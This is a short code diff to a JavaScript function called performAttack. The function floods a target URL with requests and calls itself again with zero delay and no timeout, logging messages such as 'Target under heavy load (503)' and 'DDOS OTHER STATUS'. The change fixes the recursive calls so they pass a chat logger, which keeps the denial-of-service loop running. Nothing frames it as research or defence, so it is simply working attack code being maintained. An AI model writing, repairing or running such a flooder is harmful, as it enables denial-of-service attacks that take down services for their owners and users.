@@ -113,7 +113,7 @@ const performAttack = (url, agent, headers, continueAttack, onComplete, chat) =>
         headers: headersForRequest,
         timeout: 0,
     })
-    .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0))
+    .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete, chat), 0))
     .catch((err) => {
         if (err.response?.status === 503) {
             chat.log("Target under heavy load (503).");
@@ -121,7 +121,7 @@ const performAttack = (url, agent, headers, continueAttack, onComplete, chat) =>
             chat.log("Bad Gateway (502).");
         } else if (err.response?.status === 403) return;
         chat.log("DDOS OTHER STATUS" + err.message);
-        setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0);
+        setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete, chat), 0);
     });
 };
 
